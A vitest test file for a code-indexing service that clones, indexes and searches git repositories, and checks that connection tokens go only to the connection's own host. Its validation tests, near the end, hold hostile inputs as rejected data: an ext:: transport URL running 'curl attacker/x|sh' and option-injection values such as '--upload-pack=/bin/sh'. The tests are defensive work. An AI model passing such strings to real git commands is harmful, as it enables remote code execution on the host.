import { execFileSync } from "node:child_process";
import { mkdtemp, writeFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { sql } from "@tachy/core/infra";
import {
  linkRepo,
  listRepos,
  getRepoBySlug,
  getRepoLine,
  indexRepo,
  previewIndex,
  searchCode,
  readCodeFile,
  resolveVersion,
  codeChangesBetween,
  listRemoteRefs,
  deleteRepo,
  chunkCode,
  tokenMaySendTo,
  connectionToken,
  repoDir,
  adoptSupersededIndex,
} from "@tachy/core/code";
import {
  countTree,
  indexableFiles,
} from "../../packages/core/src/code/indexer";

afterAll(() => sql.end());

let srcDir: string;
let dataDir: string;

const git = (args: string[]) =>
  execFileSync(
    "git",
    ["-c", "user.email=t@t.test", "-c", "user.name=t", ...args],
    { cwd: srcDir },
  );

const commit = async (files: Record<string, string>, message: string) => {
  for (const [path, body] of Object.entries(files))
    await writeFile(join(srcDir, path), body);
  git(["add", "-A"]);
  git(["commit", "-q", "-m", message]);
};

const PRINTER = [
  "export function resolvePrinterBuffer(size: number): number {",
  "  if (size > 1024) throw new Error('023 TOO_MANY_STRINGS');",
  "  return size * 2;",
  "}",
  "",
  "export class LabelQueue {",
  "  private items: string[] = [];",
  "  enqueue(label: string): void {",
  "    this.items.push(label);",
  "  }",
  "}",
].join("\n");

/*
 * master:              init (v1.0.0) -- #5151 queue (v1.1.0) -- chore (v1.2.0-RC.1)
 * legacy/master-1-0:   init (v1.0.0) -- #4242 legacy fix (v1.0.1)
 */
beforeAll(async () => {
  srcDir = await mkdtemp(join(tmpdir(), "tachy-src-"));
  dataDir = await mkdtemp(join(tmpdir(), "tachy-repos-"));
  process.env.TACHY_REPO_DIR = dataDir;

  git(["init", "-q", "-b", "master"]);
  // What a partial clone needs from its server: filters, and wants by blob id.
  git(["config", "uploadpack.allowFilter", "true"]);
  git(["config", "uploadpack.allowAnySHA1InWant", "true"]);
  await writeFile(join(srcDir, "ignore.bin"), Buffer.from([0, 1, 2]));
  await commit({ "printer.ts": PRINTER }, "init");
  git(["tag", "v1.0.0"]);

  git(["checkout", "-q", "-b", "legacy/master-1-0"]);
  await commit(
    {
      "legacyFix.ts":
        "export function legacyOnlyHandler(): never {\n  throw new Error('LEGACY_PATH_ERROR');\n}\n",
    },
    "#4242 legacy fix",
  );
  git(["tag", "v1.0.1"]);

  git(["checkout", "-q", "master"]);
  await commit({ "queue.ts": "export const Q = 1;\n" }, "#5151 add queue");
  git(["tag", "v1.1.0"]);
  await commit({ "queue.ts": "export const Q = 2;\n" }, "chore");
  git(["tag", "v1.2.0-RC.1"]);
});

afterAll(async () => {
  await deleteRepo("testrepo").catch(() => {});
  await sql`delete from work_items where external_id = '4242'`;
  await rm(srcDir, { recursive: true, force: true });
  await rm(dataDir, { recursive: true, force: true });
  delete process.env.TACHY_REPO_DIR;
});

describe("code indexing + search", () => {
  it("links, indexes, searches, and reads a repo end to end", async () => {
    await linkRepo({
      slug: "testrepo",
      url: `file://${srcDir}`,
      defaultBranch: "master",
      sourceSlug: "test-freshdesk",
    });
    const repos = await listRepos();
    expect(repos.some((r) => r.slug === "testrepo")).toBe(true);

    const res = await indexRepo("testrepo");
    const [master] = res.lines;
    expect(master.ref).toBe("master");
    expect(master.upToDate).toBe(false);
    expect(master.filesIndexed).toBe(2);
    expect(master.chunkCount).toBeGreaterThan(0);
    // The RC tag is on the head; the release it describes is the last real one.
    expect(master.versionLabel).toBe("v1.1.0");

    // A partial clone: contents arrive as they are read, not all up front.
    expect(
      execFileSync("git", [
        "-C",
        repoDir("testrepo"),
        "config",
        "remote.origin.promisor",
      ])
        .toString()
        .trim(),
    ).toBe("true");

    const repo = await getRepoBySlug("testrepo");
    expect(repo.index_status).toBe("ready");
    expect(repo.indexed_commit).toBe(master.indexedCommit);
    expect(repo.lines.map((l) => l.ref)).toEqual(["master"]);

    const hits = await searchCode("TOO_MANY_STRINGS printer buffer");
    expect(hits.length).toBeGreaterThan(0);
    expect(hits[0].path).toBe("printer.ts");
    expect(hits[0].line).toBe("master");
    expect(hits[0].commit).toBe(master.indexedCommit);

    const read = await readCodeFile("testrepo", "printer.ts", {
      startLine: 1,
      endLine: 3,
    });
    expect(read.content.split("\n")).toHaveLength(3);
    expect(read.content).toContain("resolvePrinterBuffer");
    expect(read.truncated).toBe(true);
    expect(read.ref).toBe("master");
  });

  it("is up to date when nothing moved", async () => {
    const res = await indexRepo("testrepo");
    expect(res.lines[0].upToDate).toBe(true);
    expect(res.lines[0].filesIndexed).toBe(0);
  });

  /*
   * An index cut short keeps what it wrote: searchable, readable, and not
   * redone by the next run, which picks up the rest.
   */
  it("keeps an interrupted index searchable and resumes it", async () => {
    await commit(
      {
        "alpha.ts":
          "export function alphaHandlerZeta(): number { return 1; }\n",
        "beta.ts": "export function betaHandlerZeta(): number { return 2; }\n",
        "gamma.ts":
          "export function gammaHandlerZeta(): number { return 3; }\n",
      },
      "three files",
    );
    const controller = new AbortController();
    await expect(
      indexRepo("testrepo", {
        signal: controller.signal,
        onProgress: (done) => {
          if (done === 1) controller.abort(new Error("cancelled"));
        },
      }),
    ).rejects.toThrow("cancelled");

    const line = await getRepoLine("testrepo");
    expect(line.index_status).toBe("error");
    expect(line.index_error).toContain("after 1/3 files");
    expect(line.indexing_commit).not.toBeNull();

    const hits = await searchCode("alphaHandlerZeta", { repoSlug: "testrepo" });
    expect(hits[0]?.path).toBe("alpha.ts");
    expect(hits[0]?.index_status).toBe("error");
    const read = await readCodeFile("testrepo", "alpha.ts");
    expect(read.content).toContain("alphaHandlerZeta");

    const again = await indexRepo("testrepo");
    expect(again.lines[0].filesIndexed).toBe(2);
    const [files] = await sql`
      select count(*)::int as n from repo_line_files where line_id = ${line.id}
    `;
    expect(files.n).toBe(5);
    expect((await getRepoLine("testrepo")).index_status).toBe("ready");
  });
});

describe("release lines", () => {
  it("embeds a blob another line already holds only once", async () => {
    await linkRepo({
      slug: "testrepo",
      url: `file://${srcDir}`,
      defaultBranch: "master",
      sourceSlug: "test-freshdesk",
      lines: ["legacy/master-1-0"],
    });
    const res = await indexRepo("testrepo", { line: "legacy/master-1-0" });
    const [legacy] = res.lines;
    expect(legacy.ref).toBe("legacy/master-1-0");
    expect(legacy.versionLabel).toBe("v1.0.1");
    expect(legacy.filesIndexed).toBe(2);
    // printer.ts is the same blob on master.
    expect(legacy.filesEmbedded).toBe(1);
  });

  it("searches a version on the line for its minor, and the default line otherwise", async () => {
    const q = "LEGACY_PATH_ERROR legacyOnlyHandler";
    const onDefault = await searchCode(q, { repoSlug: "testrepo" });
    expect(onDefault.some((h) => h.path === "legacyFix.ts")).toBe(false);

    const onVersion = await searchCode(q, {
      repoSlug: "testrepo",
      version: "1.0.3",
    });
    expect(onVersion[0]?.path).toBe("legacyFix.ts");
    expect(onVersion[0]?.line).toBe("legacy/master-1-0");

    const onLine = await searchCode(q, {
      repoSlug: "testrepo",
      line: "legacy/master-1-0",
    });
    expect(onLine[0]?.path).toBe("legacyFix.ts");
  });

  it("resolves a version to its tag and line", async () => {
    const legacy = await resolveVersion("testrepo", "v1.0.1");
    expect(legacy.tag).toBe("v1.0.1");
    expect(legacy.line.ref).toBe("legacy/master-1-0");
    expect(legacy.line_matches).toBe(true);

    const unknown = await resolveVersion("testrepo", "2.0.0");
    expect(unknown.tag).toBeNull();
    expect(unknown.line.ref).toBe("master");
    expect(unknown.line_matches).toBe(false);

    await expect(resolveVersion("testrepo", "latest")).rejects.toThrow(
      "is not a version",
    );
  });

  it("reads a file exactly as a release shipped it", async () => {
    const at = await readCodeFile("testrepo", "queue.ts", { version: "1.1.0" });
    expect(at.content).toContain("Q = 1");
    expect(at.ref).toBe("v1.1.0");
    const now = await readCodeFile("testrepo", "queue.ts");
    expect(now.content).toContain("Q = 2");
    await expect(
      readCodeFile("testrepo", "queue.ts", { version: "1.0.0" }),
    ).rejects.toThrow("not found");
  });

  it("lists what shipped after a version, with the work items it names", async () => {
    const [conn] = await sql`
      select id from source_connections where slug = 'test-freshdesk'
    `;
    await sql`
      insert into work_items (source_connection_id, external_id, title)
      values (${conn.id}, '4242', 'Legacy path throws')
      on conflict do nothing
    `;
    // Without a target, up to the head of the line the version belongs to.
    const onLine = await codeChangesBetween("testrepo", "1.0.0");
    expect(onLine.from).toBe("v1.0.0");
    expect(onLine.to).toBe("legacy/master-1-0");
    expect(onLine.commits.map((c) => c.subject)).toEqual(["#4242 legacy fix"]);
    expect(onLine.work_items.map((w) => w.external_id)).toEqual(["4242"]);

    const upgrade = await codeChangesBetween("testrepo", "1.0.0", "1.1.0");
    expect(upgrade.to).toBe("v1.1.0");
    expect(upgrade.commits.map((c) => c.subject)).toEqual(["#5151 add queue"]);
    expect(upgrade.work_items).toEqual([]);
  });

  it("drops a line and the chunks only it held", async () => {
    await linkRepo({
      slug: "testrepo",
      url: `file://${srcDir}`,
      defaultBranch: "master",
      sourceSlug: "test-freshdesk",
      lines: [],
    });
    const repo = await getRepoBySlug("testrepo");
    expect(repo.lines.map((l) => l.ref)).toEqual(["master"]);
    const [left] = await sql`
      select count(*)::int as n from code_blob_chunks
      where repo_id = ${repo.id} and chunk_text like '%LEGACY_PATH_ERROR%'
    `;
    expect(left.n).toBe(0);
  });

  it("previews what the default line would index", async () => {
    const all = await previewIndex("testrepo");
    expect(all.files_total).toBe(6);
    expect(all.files_admitted).toBe(5);
    const fewer = await previewIndex("testrepo", {
      config: { exclude: ["alpha.ts", "*.bin"] },
    });
    expect(fewer.files_admitted).toBe(4);
    expect(fewer.types.find((t) => t.ext === "ts")).toMatchObject({
      admitted: 4,
      binary: false,
      icon: "typescript",
    });
    expect(fewer.types.find((t) => t.ext === "bin")?.binary).toBe(true);
  });

  it("lists a remote's branches and tags", async () => {
    const refs = await listRemoteRefs(`file://${srcDir}`);
    expect(refs).toEqual(
      expect.arrayContaining([
        { name: "master", kind: "branch" },
        { name: "legacy/master-1-0", kind: "branch" },
        { name: "v1.0.1", kind: "tag" },
        { name: "v1.2.0-RC.1", kind: "tag" },
      ]),
    );
  });
});

describe("adopting the superseded index", () => {
  afterAll(() => sql`delete from repos where slug = 'oldrepo'`);

  it("carries files and chunks over to a default line, once", async () => {
    const [repo] = await sql`
      insert into repos (slug, url, default_branch, index_status, indexed_commit,
                         file_count, chunk_count)
      values ('oldrepo', 'https://example.invalid/old.git', 'master', 'ready',
              ${"c".repeat(40)}, 2, 1)
      returning id
    `;
    const [kept, halfWritten] = await sql`
      insert into repo_files (repo_id, path, lang, blob_sha, size_bytes)
      values (${repo.id}, 'kept.ts', 'typescript', ${"1".repeat(40)}, 10),
             (${repo.id}, 'half.ts', 'typescript', ${"2".repeat(40)}, 10)
      returning id
    `;
    await sql`
      insert into code_chunks (repo_id, file_id, ordinal, start_line, end_line, chunk_text)
      values (${repo.id}, ${kept.id}, 0, 1, 1, 'export const kept = 1;')
    `;
    expect(halfWritten.id).toBeTruthy();

    expect(await adoptSupersededIndex()).toBe(1);
    const line = await getRepoLine("oldrepo");
    expect(line).toMatchObject({
      ref: "master",
      index_status: "ready",
      indexed_commit: "c".repeat(40),
      file_count: 1,
      chunk_count: 1,
    });
    const files = await sql`
      select path from repo_line_files where line_id = ${line.id}
    `;
    expect(files.map((f) => f.path)).toEqual(["kept.ts"]);

    expect(await adoptSupersededIndex()).toBe(0);
  });
});

describe("indexableFiles", () => {
  const tree = [
    "scripts/src/lib/a.ts",
    "scripts/src/lib/a.json",
    "other/application/bopools/Pool.json",
    "other/application/config.yaml",
    "node_modules/x/index.js",
    "README.md",
  ].map((path) => ({ path, blobSha: "0".repeat(40) }));

  it("applies globs and path prefixes from config.exclude", () => {
    const kept = indexableFiles(tree, {
      exclude: ["scripts/**/*.json", "other/application/bopools"],
    }).map((f) => f.path);
    expect(kept).toEqual([
      "scripts/src/lib/a.ts",
      "other/application/config.yaml",
      "README.md",
    ]);
  });
});

describe("countTree", () => {
  const tree = [
    "api/src/a.ts",
    "api/src/b.ts",
    "api/Pods/x.h",
    "api/node_modules/y/index.js",
    "art/logo.png",
    "docs.v2/Makefile",
  ].map((path) => ({ path, blobSha: "0".repeat(40) }));

  it("counts every directory at any depth against what the config admits", () => {
    const counts = countTree(tree, { exclude: ["api/Pods"] });
    expect(counts.files_admitted).toBe(2);
    expect(counts.dirs).toEqual([
      { path: "api", files: 4, admitted: 2, skipped: false },
      { path: "api/node_modules", files: 1, admitted: 0, skipped: true },
      { path: "api/node_modules/y", files: 1, admitted: 0, skipped: true },
      { path: "api/Pods", files: 1, admitted: 0, skipped: false },
      { path: "api/src", files: 2, admitted: 2, skipped: false },
      { path: "art", files: 1, admitted: 0, skipped: false },
      { path: "docs.v2", files: 1, admitted: 0, skipped: false },
    ]);
  });

  it("lists extensions by name alone, outside the always-skipped directories", () => {
    const types = countTree(tree, {}).types;
    expect(types.map((t) => [t.ext, t.files, t.admitted, t.binary])).toEqual([
      ["ts", 2, 2, false],
      ["", 1, 0, true],
      ["h", 1, 1, false],
      ["png", 1, 0, true],
    ]);
  });

  it("never admits a binary type, even when a repo lists it", () => {
    const kept = indexableFiles(tree, { include_extensions: ["png", "ts"] });
    expect(kept.map((f) => f.path)).toEqual(["api/src/a.ts", "api/src/b.ts"]);
  });
});

describe("connection tokens", () => {
  const ado = {
    source_type: "azure-devops",
    base_url: "https://dev.azure.com/acme",
  };

  it("go only to the connection's own host", () => {
    expect(
      tokenMaySendTo(ado, "https://acme@dev.azure.com/acme/p/_git/r"),
    ).toBe(true);
    expect(tokenMaySendTo(ado, "https://acme.visualstudio.com/p/_git/r")).toBe(
      true,
    );
    expect(tokenMaySendTo(ado, "https://attacker.example/p/_git/r")).toBe(
      false,
    );
    const gh = { source_type: "github", base_url: null };
    expect(tokenMaySendTo(gh, "https://github.com/o/r.git")).toBe(true);
    expect(tokenMaySendTo(gh, "https://gitlab.com/o/r.git")).toBe(false);
  });

  it("refuses to hand a token to another host", async () => {
    await expect(
      connectionToken("test-freshdesk", "https://attacker.example/r.git"),
    ).rejects.toThrow("is not on the host of connection");
    expect(await connectionToken("test-freshdesk", "file:///tmp/r")).toBe(
      undefined,
    );
  });
});

describe("chunkCode", () => {
  it("splits long files into overlapping windows with line ranges", () => {
    const lines = Array.from({ length: 200 }, (_, i) =>
      i % 40 === 0 ? `export function f${i}() {` : `  const x${i} = ${i};`,
    );
    const chunks = chunkCode(lines.join("\n"));
    expect(chunks.length).toBeGreaterThan(2);
    expect(chunks[0].startLine).toBe(1);
    for (const c of chunks)
      expect(c.endLine).toBeGreaterThanOrEqual(c.startLine);
    expect(chunks.at(-1)!.endLine).toBe(200);
    for (let i = 1; i < chunks.length; i++)
      expect(chunks[i].startLine).toBeLessThanOrEqual(
        chunks[i - 1].endLine + 1,
      );
  });

  it("keeps single small files as one chunk", () => {
    const chunks = chunkCode("const a = 1;\nconst b = 2;");
    expect(chunks).toHaveLength(1);
    expect(chunks[0].startLine).toBe(1);
    expect(chunks[0].endLine).toBe(2);
  });
});

describe("repo URL and branch validation", () => {
  it("refuses git transports and option-shaped positionals", async () => {
    for (const url of [
      // git's ext:: transport is documented command execution.
      "ext::sh -c 'curl attacker/x|sh'",
      // A positional starting with `-` is read by git as an option.
      "--upload-pack=/bin/sh",
      "-u/bin/sh",
      "not a url at all",
    ])
      await expect(linkRepo({ slug: "badrepo", url })).rejects.toThrow(
        "is not a repository URL",
      );
  });

  it("refuses a branch name git would read as an option", async () => {
    for (const defaultBranch of ["--upload-pack=/bin/sh", "-x", "a..b", "x y"])
      await expect(
        linkRepo({
          slug: "badbranch",
          url: "https://example.invalid/r.git",
          defaultBranch,
        }),
      ).rejects.toThrow(/not a valid branch name|not a repository URL/);
  });

  it("refuses a line name the same way", async () => {
    await expect(
      linkRepo({
        slug: "badline",
        url: "https://example.invalid/r.git",
        lines: ["--upload-pack=/bin/sh"],
      }),
    ).rejects.toThrow("not a valid branch name");
  });
});
